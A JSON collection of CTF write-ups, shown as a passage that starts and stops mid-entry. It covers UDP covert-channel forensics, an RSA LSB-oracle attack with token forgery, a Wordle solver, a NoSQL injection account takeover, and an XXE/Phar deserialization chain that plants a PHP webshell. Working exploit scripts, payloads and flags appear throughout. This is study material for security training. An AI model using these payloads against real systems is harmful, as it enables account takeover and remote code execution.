  "analysis": "Network traffic analysis reveals several key findings:\n\n1. **All traffic is UDP**: 100% of packets use UDP protocol on port 9897\n2. **Custom Protocol**: Wireshark shows generic 'data' payload without protocol classification\n3. **Non-standard Encoding**: Packet headers use a custom 3-digit decimal per ASCII character encoding scheme\n4. **Packet Structure**:\n   - 4 nibbles: Sequence ID\n   - 2 nibbles: Header length (hex)\n   - Header text: ASCII characters encoded as 3-digit decimal values\n   - Payload: Binary data (actual file content)\n5. **Covert Channel**: Flag is hidden in packet headers as conversational text, not in the transmitted file payload - a classic steganographic technique",
  "solution": [
    {
      "title": "Initial Reconnaissance",
      "content": "Use tshark to analyze packet statistics and understand the protocol composition. Extract all UDP packets and examine their hex dumps for patterns."
    },
    {
      "title": "Protocol Reverse Engineering",
      "content": "Analyze the hex structure of UDP packets. Identify that the 3-digit decimal encoding is used for header text. Example: 084 = 'T', 114 = 'r', 097 = 'a'. This reveals the header contains readable ASCII text.",
      "code": "# Decode 3-digit decimal to ASCII\nhex_stream = \"084114097\"\ntext = \"\"\nfor i in range(0, len(hex_stream), 3):\n    text += chr(int(hex_stream[i:i+3]))\n# Result: \"Tra\""
    },
    {
      "title": "Packet Structure Analysis",
      "content": "Map the packet layout:\n- Bytes 0-3: Sequence ID (4 hex digits)\n- Bytes 4-5: Header length in hex\n- Bytes 6 onwards: Header text (3 digits per character) followed by payload data\n\nIdentify that header length indicates how many characters to decode before the binary payload starts."
    },
    {
      "title": "Extract Header Information",
      "content": "Create a solver script that iterates through all UDP packets, extracts the header length field, and decodes the header text by converting each 3-digit decimal group to its ASCII equivalent.",
      "code": "import binascii\n\nprint(\"[*] Analyzing Packet Headers...\")\n\nwith open(\"all_udp_data.txt\", \"r\") as f:\n    lines = f.readlines()\n\nseen = set()\n\nfor line in lines:\n    line = line.strip()\n    if len(line) < 10: \n        continue\n    \n    try:\n        # Extract header length (hex) at position 4-5\n        len_hex = line[4:6]\n        header_len = int(len_hex, 16)\n        \n        # Calculate header end (each character = 3 digits)\n        header_end = 6 + (header_len * 3)\n        header_hex = line[6:header_end]\n        header_text = \"\"\n        \n        # Decode header text (3 digits -> ASCII)\n        for i in range(0, len(header_hex), 3):\n            val = int(header_hex[i:i+3])\n            header_text += chr(val)\n        \n        # Filter and display unique headers (excluding Ack)\n        if \"Ack\" not in header_text and header_text not in seen:\n            print(f\"[FOUND] Header Text: {header_text}\")\n            seen.add(header_text)\n    \n    except:\n        continue"
    },
    {
      "title": "Flag Discovery",
      "content": "Execute the solver script against all captured UDP packets. The script reveals a conversational exchange embedded in packet headers. The flag is hidden within a personal message in packet headers 2-3, not in the payload data (which contains a mixtape/media file).",
      "code": "# Sample script output:\n# [FOUND] Header Text: Begin Transmission: 1\n# [FOUND] Header Text: Dear VuwCTF engineer. I hope you are enjoying the mixtape...\n# [FOUND] Header Text: Did you appreciate the inscription? I wrote it just for you! \n#                      It said your name, and it said VuwCTF{d0_y0u_wan7_t0,,,l15t3n_t0_it?}\n# [FOUND] Header Text: Complete Transmission"
    }
  ],
  "flag": "VuwCTF{d0_y0u_wan7_t0,,,l15t3n_t0_it?}",
  "lessonsLearned": "**Protocol Analysis** - Network forensics requires examining all packet fields, not just payload data. Custom protocols can hide information in headers, metadata, or other structural elements.\n\n**Encoding vs Encryption** - Flag encoding doesn't always involve cryptography. Simple character encoding (3-digit decimal) can effectively obscure data from quick examination.\n\n**Covert Channels** - Covert channels in network traffic are real security concerns. Information can be hidden in sequence numbers, timing, packet order, or header fields.\n\n**Protocol Reverse Engineering** - When analyzing unknown protocols, fuzzing field positions and checking for ASCII patterns is an effective reverse engineering technique.\n\n**Hidden Secrets** - Don't assume the main file transfer is the goal. Metadata and headers often contain the real secrets and important information.\n\n**Systematic Examination** - Always perform packet-by-packet analysis. Extract and test each field independently to find the source of meaningful information."

},
{
  "id": "7",
  "title": "Sloppy Admin 1",
  "category": "Crypto",
  "difficulty": "Hard",
  "points": 0,
  "date": "2025-02-24",
  "author": "CTF Team",
  "ctfName": "m0lecon CTF",
  "description": "RSA cryptography challenge involving LSB Oracle Attack, public key recovery via GCD, and token forgery. Exploit multiple vulnerabilities in a custom authentication system to steal the CEO's password.",
  "problemDescription": "A custom RSA authentication system (1024-bit, e=65537) that verifies tokens through an LSB Oracle function. The system allows users to register, receive encrypted tokens, and authenticate. Goal: obtain the CEO's plaintext password and login to retrieve the flag.",
  "tools": [
    "pwntools",
    "pycryptodome",
    "Python 3",
    "RSA Cryptanalysis",
    "Oracle Attack"
  ],
  "analysis": "The authentication system exhibits three critical cryptographic vulnerabilities:\n\n1. **LSB Oracle Vulnerability**: Token verification function reveals plaintext parity through different server responses\n   - Even plaintext (LSB=0): 'got lucky this time!'\n   - Odd plaintext (LSB=1): 'Authentication failed!'\n   - This enables Bleichenbacher's LSB Oracle Attack\n\n2. **Public Key Recovery via GCD**: Server does not provide the modulus N. However, by registering with known passwords and obtaining ciphertexts, attackers can recover N using GCD of differences:\n   - m^e ≡ c (mod N) implies m^e - c = k·N\n   - N = GCD(m₁^e - c₁, m₂^e - c₂, m₃^e - c₃)\n\n3. **Default Credentials**: Admin password is set to 'adminpassword' (recoverable via token forgery), allowing attackers to login and steal the CEO's encrypted token",
  "mathAnalysis": [
    {
      "title": "RSA Key Recovery",
      "formula": "N = \\text{GCD}(m_1^e - c_1, m_2^e - c_2, m_3^e - c_3)",
      "description": "Recover RSA modulus using GCD of multiple (plaintext, ciphertext) pairs",
      "variant": "highlight"
    },
    {
      "title": "LSB Oracle Binary Search",
      "formula": "\\text{plaintext} \\in [\\text{lower}, \\text{upper}] \\text{ refined by LSB feedback}",
      "description": "Iteratively halve the plaintext range based on LSB oracle responses",
      "variant": "default"
    },
    {
      "title": "Ciphertext Multiplication",
      "formula": "c_{next} = (c_{current} \\times (2^e \\bmod N)) \\bmod N",
      "description": "Multiply ciphertexts to test plaintext bits without decryption key",
      "variant": "default"
    }
  ],
  "solution": [
    {
      "title": "Vulnerability Discovery",
      "content": "Analyze the token verification mechanism. Identify that the random_bool_gen() function only checks the LSB (Least Significant Bit) of the decrypted plaintext, creating an oracle that leaks plaintext parity."
    },
    {
      "title": "Step 1: Public Key Recovery via GCD",
      "content": "Register three users with known passwords (pass_a, pass_b, pass_c) and obtain their encrypted tokens. Calculate N using GCD of differences between plaintext encryptions and obtained ciphertexts. This recovers the 1024-bit RSA modulus.",
      "code": "from Crypto.Util.number import bytes_to_long, long_to_bytes, GCD\n\n# Register three users and collect tokens\nusers = [(\"user_a\", \"pass_a\"), (\"user_b\", \"pass_b\"), (\"user_c\", \"pass_c\")]\ntokens, plaintexts = [], []\n\nfor username, password in users:\n    token = register(username, password)\n    tokens.append(int(token, 16))\n    plaintexts.append(bytes_to_long(password.encode()))\n\n# Recover modulus N\ne = 65537\nvals = [pow(m, e) - c for m, c in zip(plaintexts, tokens)]\nN = GCD(vals[0], GCD(vals[1], vals[2]))\n\nprint(f\"[+] Recovered N: {hex(N)}\")"
    },
    {
      "title": "Step 2: Admin Login & CEO Token Theft",
      "content": "Use the recovered modulus N to forge a valid token for 'adminpassword'. Login as admin to access the dashboard and retrieve the CEO's encrypted token for further analysis.",
      "code": "# Forge admin token\nadmin_token = pow(bytes_to_long(b\"adminpassword\"), e, N)\nadmin_token_hex = long_to_bytes(admin_token).hex()\n\n# Login as admin\nlogin(\"admin\", \"adminpassword\", admin_token_hex)\n\n# Steal CEO's encrypted token\nceo_token = get_ceo_token_from_dashboard()"
    },
    {
      "title": "Step 3: LSB Oracle Attack Setup",
      "content": "Prepare for binary search attack. Since the CEO password is only 32 bytes (256 bits) out of the 1024-bit modulus, optimize by skipping the first 664 bits. This reduces the oracle queries from 1024 to approximately 360 queries."
    },
    {
      "title": "Step 4: Optimized Binary Search with Pipelining",
      "content": "Implement binary search using LSB oracle responses. For each bit position:\n- Multiply ciphertext by 2^e (mod N) to shift bits\n- Send token to server and read LSB oracle response\n- Refine upper/lower bounds based on response\n\nUse request pipelining to send all inputs together, reducing network latency and staying within server timeout constraints.",
      "code": "# Binary search with skip optimization\nTOTAL_BITS, TARGET_BITS = 1024, 360\nSKIP_BITS = TOTAL_BITS - TARGET_BITS\n\nupper = Decimal(N) / (Decimal(2) ** SKIP_BITS)\nlower = Decimal(0)\n\ncurrent_c = (ceo_token * pow(pow(2, e, N), SKIP_BITS, N)) % N\nmultiplier = pow(2, e, N)\n\nfor i in range(SKIP_BITS, TOTAL_BITS):\n    current_c = (current_c * multiplier) % N\n    c_hex = long_to_bytes(current_c).hex()\n    \n    # Pipelined request\n    send_all_at_once([\"2\", \"CEO\", \"dummy\", c_hex])\n    \n    # Read LSB oracle response\n    response = get_response()\n    \n    # Refine bounds\n    diff = upper - lower\n    if \"lucky\" in response:  # LSB is 0 (even)\n        upper = lower + (diff / 2)\n    else:  # LSB is 1 (odd)\n        lower = lower + (diff / 2)\n\n# Extract password from final range\npassword = long_to_bytes(int(upper))"
    },
    {
      "title": "Step 5: Final Login & Flag Extraction",
      "content": "Use the recovered CEO password along with the stolen encrypted token to login as CEO. The server will display the flag as authentication completes.",
      "code": "# Login as CEO with recovered credentials\npassword_recovered = long_to_bytes(int(upper))\nlogin(\"CEO\", password_recovered, ceo_token_hex)\n\n# Flag displayed in welcome message\n# Output: \"Welcome CEO! Here is the flag: ptm{A1w4y5_m4k3_5ur3_t0_ch4ng3_y0ur_d3f4u1t_p4s5w0rd!}\""
    }
  ],
  "flag": "ptm{A1w4y5_m4k3_5ur3_t0_ch4ng3_y0ur_d3f4u1t_p4s5w0rd!}",
  "lessonsLearned": "**Information Leaks** - RSA security depends on keeping the private key secret. Even information leaks about plaintext properties (LSB, parity) enable devastating attacks like Bleichenbacher's oracle.\n\n**Compound Vulnerabilities** - Never rely on a single piece of security information. Multi-factor design (oracle + key recovery) creates compound vulnerabilities that are exponentially more dangerous.\n\n**Default Credentials** - Default credentials must always be changed in production systems. Change default passwords immediately upon system deployment.\n\n**Oracle Attacks** - Binary search via oracle is an efficient technique when exact decryption is impossible. Timing/response differences can leak one bit of information per request.\n\n**Optimization** - Network optimization (pipelining, skipping unnecessary bits) is critical in time-constrained attacks. Parallelization and smart enumeration reduce exploitation time significantly.\n\n**RSA Reuse** - GCD-based key recovery shows that reusing RSA keys across different applications is dangerous. Each ciphertext is a potential source of information about the modulus."

},
{
  "id": "8",
  "title": "Wordler Solver 1",
  "category": "Misc",
  "difficulty": "Medium",
  "points": 0,
  "date": "2025-02-24",
  "author": "CTF Team",
  "ctfName": "Lake CTF 2025",
  "description": "Multi-word Wordle variant with ANSI color-coded feedback. Develop an automated solver using dictionary-based word refinement and ANSI escape code parsing to solve within 6 guesses across multiple game sessions.",
  "problemDescription": "A server-based game combining Wordle mechanics with multiple words separated by underscores. Game structure (word lengths) changes per connection. Each guess receives color-coded feedback via ANSI escape codes (green=correct position, yellow=wrong position, grey=not in word). Maximum 6 guesses per session. Solver must parse variable-length word structures, extract color feedback, refine guesses iteratively, and retrieve the flag from successful solutions.",
  "tools": [
    "Python 3",
    "Regex",
    "Socket Programming",
    "ANSI Escape Code Parsing",
    "Dictionary-based Wordlist"
  ],
  "analysis": "The challenge presents several key technical requirements:\n\n1. **Variable Structure**: Each connection provides a different word-length pattern (e.g., [8, 8, 11] for three words)\n2. **ANSI Color Encoding**: Feedback uses escape sequences - \\x1b[92m for green, \\x1b[93m for yellow, \\x1b[90m for grey\n3. **Limited Attempts**: Only 6 guesses per session, but multiple sessions allowed until flag is obtained\n4. **Dictionary Dependency**: Required custom wordlist containing words of all necessary lengths (or use common word dictionary)\n5. **Stateless Guessing**: Each new connection resets the puzzle with different structure and target words",
  "solution": [
    {
      "title": "Parse Server Structure",
      "content": "Extract the puzzle structure from server banner. The structure uses block symbols (■) separated by underscores, where each block represents letter count. Parse this to determine how many words are needed and their respective lengths."
    },
    {
      "title": "Load Dictionary",
      "content": "Prepare a wordlist indexed by word length. For solving efficiency, group all words by their length in a dictionary/hashmap. This allows rapid lookup of valid words matching specific patterns."
    },
    {
      "title": "Initial Guess Selection",
      "content": "For first guess, select the first word from the wordlist for each required length. This provides baseline feedback without optimization. Common strategy: use high-frequency letters in consonant-vowel patterns."
    },
    {
      "title": "ANSI Escape Code Parsing",
      "content": "Parse server response to extract color codes for each letter. Use regex to identify ANSI sequences and map them to color states (Green, Yellow, Grey). Build a color mask per word block.",
      "code": "import re\n\ndef parse_colors(line, block_sizes):\n    color_map = []\n    tmp = ''\n    idx = 0\n    \n    # Pattern matches: \\x1b[9Xm(LETTER)\\x1b[0m where X is 2,3, or 0\n    pattern = r\"\\x1b\\[9([023])m([A-Z])\\x1b\\[0m\"\n    \n    for match in re.finditer(pattern, line):\n        code = match.group(1)\n        if code == '2':    # Green\n            tmp += 'G'\n        elif code == '3':  # Yellow\n            tmp += 'Y'\n        else:              # Grey\n            tmp += '-'\n        \n        if len(tmp) == block_sizes[idx]:\n            color_map.append(tmp)\n            tmp = ''\n            idx += 1\n    \n    return color_map"
    },
    {
      "title": "Iterative Word Refinement",
      "content": "For each color mask feedback, find the next candidate word that:\n- Matches all GREEN positions from previous guess\n- Has not been tried before (avoid repetition)\n- Exists in dictionary for that word length\n\nEach iteration tightens constraints until all letters turn green.",
      "code": "def refine_guess(previous_word, color_mask, used_words):\n    word_length = len(color_mask)\n    \n    for candidate in DICTIONARY[word_length]:\n        if candidate in used_words:\n            continue\n        \n        # Check if candidate matches all green positions\n        valid = True\n        for position, color in enumerate(color_mask):\n            if color == 'G':\n                if previous_word[position] != candidate[position]:\n                    valid = False\n                    break\n        \n        if valid:\n            used_words.add(candidate)\n            return candidate\n    \n    raise RuntimeError(f\"No valid word found for pattern {color_mask}\")"
    },
    {
      "title": "Main Solving Loop",
      "content": "Repeat for multiple game sessions until flag is received:\n1. Parse structure from server\n2. Generate initial guess using first words from each length group\n3. Send guess, receive colored response\n4. Parse colors and refine each word block\n5. Repeat up to 6 times per session\n6. Exit when flag (EPFL{...}) appears in server response",
      "code": "for session in range(300):  # Allow many sessions\n    sock = socket.create_connection((\"chall.polygl0ts.ch\", 6052))\n    \n    # Get structure\n    banner = sock.recv(1024).decode('utf-8')\n    structure = parse_structure(banner)\n    lengths = get_word_lengths(structure)\n    \n    # Initialize guess\n    guess = [DICTIONARY[length][0] for length in lengths]\n    used = set(guess)\n    \n    # Six attempts\n    for attempt in range(6):\n        guess_str = '_'.join(guess)\n        sock.sendall((guess_str + '\\n').encode())\n        \n        response = recv_until(sock, [b'Your guess:', b'EPFL{'])\n        \n        if b'EPFL{' in response:\n            print(\"[+] FLAG FOUND!\")\n            print(response.decode('utf-8'))\n            exit(0)\n        \n        # Parse feedback and refine\n        colors = parse_colors(response, lengths)\n        guess = [refine_guess(g, c, used) for g, c in zip(guess, colors)]\n    \n    sock.close()\n\nprint(\"[+] Puzzle solved after multiple sessions\")"
    }
  ],
  "flag": "EPFL{5CR1P71NG_15_CH34T1NG}",
  "lessonsLearned": "**Input Parsing** - Wordle-variant challenges require robust parsing of variable input formats. Always extract structure before processing to make solving systematic and reliable.\n\n**Terminal Output** - ANSI color codes are common in terminal-based CTF challenges. Regex and character-by-character parsing are essential tools for terminal output analysis.\n\n**Dictionary Optimization** - Dictionary-based solving is effective for word games. Preprocessing by length dramatically improves lookup speed and reduces computation.\n\n**Automation** - Multi-session challenges can be solved by automating the entire workflow within a loop. Stateless puzzles benefit from repeating the attack across many sessions.\n\n**Heuristics** - Limited attempts benefit from greedy/heuristic approaches. Perfect optimization isn't always necessary; smart initial guesses improve convergence.\n\n**Buffer Management** - Terminal output parsing requires careful handling of escape sequences, line breaks, and timing. Use robust buffer management (recv_until patterns) rather than fixed-size reads.\n\n**Strategy** - Consider word frequency and letter distribution for initial guess selection. Starting with common words improves convergence in brute-force word finding approaches."

},
{
  "id": "9",
  "title": "Pooking",
  "category": "Web",
  "difficulty": "Medium",
  "points": 0,
  "date": "2025-02-24",
  "author": "CTF Team",
  "ctfName": "FlagYard",
  "description": "Premium car rental platform with critical NoSQL injection vulnerabilities. Exploit blind NoSQL injections and token exhaustion to achieve account takeover of admin user and extract the flag.",
  "problemDescription": "A Node.js/MongoDB-based web application simulating a luxury car rental service. The backend implements custom authentication endpoints with insufficient input validation. Goal: gain unauthorized access to the admin account and retrieve the hidden flag embedded in the API response.",
  "tools": [
    "Python 3",
    "cURL",
    "Burp Suite",
    "NoSQL Injection Techniques",
    "MongoDB Query Manipulation"
  ],
  "analysis": "Security analysis reveals four critical vulnerabilities chained together in the API implementation:\n\n**Vulnerability 1: Blind NoSQL Injection on /api/forgot-password**\n\nThe endpoint accepts an email parameter that is directly interpolated into MongoDB queries without sanitization. By sending operator objects with regex patterns in the JSON payload, an attacker can perform regex-based queries. Each request returns either 200 OK (match found) or 404 Not Found (no match), creating a response-based oracle allowing character-by-character enumeration of usernames.\n\n**Vulnerability 2: Insufficient Token Validation on /api/reset-password**\n\nThe password reset endpoint accepts a token field in the request body, which is directly used in a MongoDB filter condition without verification. An attacker can send wildcard regex patterns to match ANY token in the database, not just their own.\n\n**Vulnerability 3: Sequential Document Processing Flaw**\n\nMongoDB's findOne() method returns the first matching document in insertion order. When multiple tokens match the wildcard pattern, only the first document is updated. By repeatedly sending requests with the same wildcard token filter, an attacker exhausts tokens until reaching the target admin account.\n\n**Vulnerability 4: Sensitive Data Leakage in API Response**\n\nThe web UI does not display sensitive admin fields, but the backend leaks them directly in the JSON response from /api/login. The flag is embedded in the user object returned after successful authentication, discoverable only through raw HTTP response inspection.",
  "solution": [
    {
      "title": "Step 1: Reconnaissance & Vulnerability Mapping",
      "content": "Analyze the web application to identify backend technology (MongoDB via ObjectID format 699c9327...) and API endpoints. Test basic NoSQL operators ($ne, $regex) against different endpoints to determine which is injectable."
    },
    {
      "title": "Step 2: Email Enumeration via Blind NoSQL Injection",
      "content": "Use the /api/forgot-password endpoint to enumerate admin email character-by-character. Send requests with {\"email\": {\"$regex\": \"^[charset]\"}} payloads. A 200 response indicates the character is present; 404 indicates it's not. Iterate through all possible characters in optimized order (digits first, then letters) to reconstruct the full email address.",
      "code": "import requests\nimport string\n\nBASE_URL = \"http://target:port/api/forgot-password\"\n\ndef check_email_prefix(prefix):\n    payload = {\"email\": {\"$regex\": f\"^{prefix}\"}}\n    response = requests.post(BASE_URL, json=payload)\n    return response.status_code == 200\n\nemail = \"\"\ncharset = string.digits + string.ascii_lowercase + \".-@\"\n\nfor pos in range(50):  # Max email length\n    for char in charset:\n        test_prefix = email + char\n        if check_email_prefix(test_prefix):\n            email = test_prefix\n            print(f\"[+] Found: {email}\")\n            break\n    else:\n        print(f\"[*] Email completed: {email}\")\n        break"
    },
    {
      "title": "Step 3: Trigger Reset Token Generation",
      "content": "Once the admin email is identified (e.g., 4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com), trigger the forgot-password mechanism by requesting a password reset token. This causes the backend to generate and store a reset token in the admin's document."
    },
    {
      "title": "Step 4: Token Exhaustion & Password Reset",
      "content": "Exploit the /api/reset-password endpoint with wildcard token matching. Send multiple requests with {\"token\": {\"$regex\": \"^.*\"}, \"newPassword\": \"HackedPassword123!\"} payload. Each request resets the password of the first user with a matching token. This sequentially burns through dummy account tokens until the admin account is reached, whose password is then forcibly changed to a value under attacker control.",
      "code": "import requests\nimport time\n\nBASE_URL = \"http://target:port/api/reset-password\"\nADMIN_EMAIL = \"4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com\"\nNEW_PASSWORD = \"HackedPassword123!\"\n\n# Token exhaustion loop\nfor attempt in range(1, 100):\n    payload = {\n        \"token\": {\"$regex\": \"^.*\"},\n        \"newPassword\": NEW_PASSWORD\n    }\n    \n    response = requests.post(BASE_URL, json=payload)\n    print(f\"[*] Attempt {attempt}: {response.status_code}\")\n    \n    if \"success\" in response.json():\n        print(f\"[+] Password reset successful!\")\n        break\n    \n    time.sleep(0.5)  # Small delay to avoid rate limiting"
    },
    {
      "title": "Step 5: Admin Account Takeover & Login",
      "content": "With the admin password compromised, authenticate to /api/login using the known email and the new password. The backend will return a JSON response containing the admin user object with sensitive data including the hidden flag."
    },
    {
      "title": "Step 6: Flag Extraction",
      "content": "Examine the raw JSON response from the login endpoint. The flag is embedded in the user object returned by the server, not visible in the web UI. Extract the flag field from the API response.",
      "code": "curl -s -X POST http://target:port/api/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"email\": \"4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com\",\n    \"password\": \"HackedPassword123!\"\n  }' | jq '.user.flag'\n\n# Output: FlagY{9f4e47684e72251c97a092123b6176c1}"
    }
  ],
  "terminalOutputs": [
    {
      "command": "python3 solve.py",
      "output": "nata@rblx-labs ~/ctf/flagyard/web/14\n % python3 solve.py\n[*] Starting email extraction with digit priority...\nAttempt     5: ✓ '4'\nAttempt    19: ✓ '4d'\nAttempt    42: ✓ '4dm'\nAttempt    44: ✓ '4dm1'\nAttempt    68: ✓ '4dm1n'\nAttempt    70: ✓ '4dm1n1'\nAttempt    76: ✓ '4dm1n15'\nAttempt   106: ✓ '4dm1n15t'\nAttempt   134: ✓ '4dm1n15tr'\nAttempt   139: ✓ '4dm1n15tr4'\nAttempt   169: ✓ '4dm1n15tr4t'\nAttempt   170: ✓ '4dm1n15tr4t0'\nAttempt   198: ✓ '4dm1n15tr4t0r'\nAttempt   235: ✓ '4dm1n15tr4t0r@'\nAttempt   261: ✓ '4dm1n15tr4t0r@p'\nAttempt   262: ✓ '4dm1n15tr4t0r@p0'\nAttempt   263: ✓ '4dm1n15tr4t0r@p00'\nAttempt   284: ✓ '4dm1n15tr4t0r@p00k'\nAttempt   286: ✓ '4dm1n15tr4t0r@p00k1'\nAttempt   310: ✓ '4dm1n15tr4t0r@p00k1n'\nAttempt   327: ✓ '4dm1n15tr4t0r@p00k1ng'\nAttempt   367: ✓ '4dm1n15tr4t0r@p00k1ng.'\nAttempt   383: ✓ '4dm1n15tr4t0r@p00k1ng.f'\nAttempt   405: ✓ '4dm1n15tr4t0r@p00k1ng.fl'\nAttempt   410: ✓ '4dm1n15tr4t0r@p00k1ng.fl4'\nAttempt   427: ✓ '4dm1n15tr4t0r@p00k1ng.fl4g'\nAttempt   462: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy'\nAttempt   467: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy4'\nAttempt   495: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy4r'\nAttempt   509: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy4rd'\nAttempt   549: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy4rd.'\nAttempt   562: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy4rd.c'\nAttempt   587: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy4rd.co'\nAttempt   610: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com'\n✓ VERIFIED: 4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com\nAttempt    852: trying '4dmy'^C\n\nInterrupted by user.\n\nCurrent collected emails (1 total):\n- 4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com"
    },
    {
      "command": "curl -s -X POST http://target/api/login -H 'Content-Type: application/json' -d '{\"email\": \"4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com\", \"password\": \"HackedPassword123!\"}'",
      "output": "{\n  \"success\": true,\n  \"message\": \"Login successful\",\n  \"user\": {\n    \"_id\": \"699c9327e39607aefcd8dbe8\",\n    \"email\": \"4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com\",\n    \"password\": \"$2b$10$ggX4rt5vlqXhH5BpuZVOoOlK5Ct16WvDo5q5jTqZuNIW3b5x/QZb2\",\n    \"fullName\": \"Senior Administrator\",\n    \"phone\": \"+966501234570\",\n    \"role\": \"senior_admin\",\n    \"isActive\": true,\n    \"flag\": \"FlagY{9f4e47684e72251c97a092123b6176c1}\",\n    \"department\": \"IT Security\",\n    \"accessLevel\": \"Level 5\",\n    \"createdAt\": \"2023-01-01T00:00:00.000Z\",\n    \"lastLogin\": \"2026-02-23T19:05:01.319Z\"\n  }\n}"
    }
  ],
  "flag": "FlagY{9f4e47684e72251c97a092123b6176c1}",
  "lessonsLearned": "**Input Validation** - Never trust user input in database queries. Always use parameterized queries and proper input validation. NoSQL operators like $regex must be explicitly blocked in user-controlled parameters.\n\n**Token Management** - Password reset mechanisms are critical security components. Implement proper token validation (time-limited, single-use, cryptographically random) to prevent unauthorized access.\n\n**Query Security** - Query results should not rely on insertion order for security decisions. Always use explicit accountability mechanisms and verify users can only access their own data.\n\n**Data Exposure** - Sensitive data should never be exposed in API responses, even to authenticated users without explicit authorization. Implement proper field filtering based on user role.\n\n**Rate Limiting** - Implement rate limiting on authentication and password reset endpoints to prevent token exhaustion attacks and brute-force attempts.\n\n**Defense in Depth** - Combine input validation, proper query construction, and response sanitization to prevent information disclosure. Single-layer defenses are insufficient.\n\n**Optimization** - When exploiting APIs with many requests, implement parallel requests and smart enumeration strategies to accelerate the exploitation timeline."

},
{
  "id": "10",
  "title": "Meme Upload Service",
  "category": "Web",
  "difficulty": "Hard",
  "points": 0,
  "date": "2025-02-24",
  "author": "CTF Team",
  "ctfName": "247CTF",
  "description": "Advanced web exploitation chaining file upload bypass, XML External Entity (XXE) injection, and PHP Phar deserialization to achieve Remote Code Execution (RCE). Requires bypassing multiple validation layers.",
  "problemDescription": "A meme upload service with two features: image upload (with strict validation) and XML message storage. The application validates file uploads using MIME type checks and getimagesize(), then parses XML messages with schema validation. Goal: bypass all security checks to achieve arbitrary code execution and retrieve the flag file.",
  "tools": [
    "PHP",
    "Python 3",
    "Phar Archive Manipulation",
    "XXE Injection",
    "Magic Bytes Spoofing",
    "PHP Serialization"
  ],
  "analysis": "This challenge chains three distinct vulnerabilities into a complete exploitation chain:\n\n**Vulnerability 1: Insecure XML External Entity (XXE) Processing**\n\nThe application loads XML with `$msgXml->loadXML($_POST[\"message\"], LIBXML_DTDLOAD);`. The LIBXML_DTDLOAD flag enables parsing of external DTD files, allowing attackers to inject custom DOCTYPE declarations with SYSTEM entities. This opens the door to XXE attacks using stream wrappers like phar://.\n\n**Vulnerability 2: File Upload Bypass via Magic Bytes**\n\nThe getimagesize() function validates uploaded files by reading image headers (magic bytes). By prepending a valid GIF header (GIF8) to arbitrary data, the function accepts the file as legitimate. Additionally, a 185-byte size limit forces payload minimization through Phar signature algorithm reduction (MD5 instead of SHA256).\n\n**Vulnerability 3: Unsafe PHP Object Deserialization via Phar**\n\nPHP's phar:// stream wrapper automatically deserializes metadata stored in Phar archives when accessed. If the metadata contains serialized PHP objects of classes present in the application (like Message), accessing phar://path/to/file triggers automatic deserialization and invokes magic methods like __destruct().\n\n**Chaining the Vulnerabilities**\n\nThe Message class's __destruct() method writes arbitrary content to arbitrary paths using file_put_contents(). By crafting a malicious Phar with a Message object where filePath='a.php' and manipulated properties containing PHP code, attackers can write executable webshells to the web root.",
  "solution": [
    {
      "title": "Step 1: Analyze Source Code Structure",
      "content": "Examine index.php and valid_message.xsd to understand validation logic. Identify the Message class and its __destruct() magic method as the key to code execution. The destructor writes three variables to a file, any of which can contain PHP code."
    },
    {
      "title": "Step 2: Craft Malicious Phar Archive",
      "content": "Create a Phar file that:\n1. Has GIF8 magic bytes prepended to bypass getimagesize()\n2. Uses MD5 signature to stay under 185-byte limit\n3. Contains a serialized Message object in metadata with: filePath set to 'a.php', to property containing PHP code like '<?=`$_GET[0]`?>'\n4. The __destruct() will write this into a.php when deserialized",
      "code": "<?php\nclass Message {};\n$obj = new Message;\n$obj->to = '<?=`$_GET[0]`?>';\n$obj->filePath = 'a.php';\n\n$phar = new Phar('tmp.phar');\n$phar->setSignatureAlgorithm(Phar::MD5);\n$phar->startBuffering();\n$phar->setStub('GIF8<?php __HALT_COMPILER();');\n$phar->setMetadata($obj);\n$phar->addFromString('a', '');\n$phar->stopBuffering();\n\n$f = fopen('tmp.phar', 'r');\necho fread($f, filesize('tmp.phar'));\nfclose($f);\n@unlink('tmp.phar');\n?>"
    },
    {
      "title": "Step 3: Upload Malicious File",
      "content": "Upload the Phar file through the image upload endpoint. The file passes all validation checks because:\n- Magic bytes GIF8 satisfy getimagesize()\n- MIME type matches image/gif\n- File size is under 185 bytes\nThe endpoint returns the upload path (e.g., /tmp/images/xxxx.gif)"
    },
    {
      "title": "Step 4: Craft XXE Payload",
      "content": "Create an XML payload with DOCTYPE that references the uploaded Phar file using phar:// stream wrapper. When the XML parser processes the external entity, it reads from phar://path/to/image.gif, triggering automatic Phar deserialization.",
      "code": "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"phar:///tmp/images/UPLOAD_PATH\"> %xxe;]>\n<message>\n  <to>a</to>\n  <from>b</from>\n  <image>c</image>\n</message>"
    },
    {
      "title": "Step 5: Trigger Deserialization",
      "content": "Submit the XXE payload via POST to the message endpoint. The XML parser attempts to load the DOCTYPE entity from phar://, which automatically deserializes the Message object. The object's __destruct() is invoked during garbage collection, writing the PHP webshell to a.php in the web root."
    },
    {
      "title": "Step 6: Execute Commands via Webshell",
      "content": "Access a.php with GET parameters. The webshell executes arbitrary commands via backticks in PHP. Use this to find the flag file location and read its contents.",
      "code": "# Find flag files\ncurl 'https://target/a.php?0=find%20/%20-name%20%27*flag*%27%202>/dev/null'\n\n# Read flag\ncurl 'https://target/a.php?0=cat%20/tmp/flag_XXXXXXX.txt'"
    },
    {
      "title": "Step 7: Automated Exploitation Script (solve.py)",
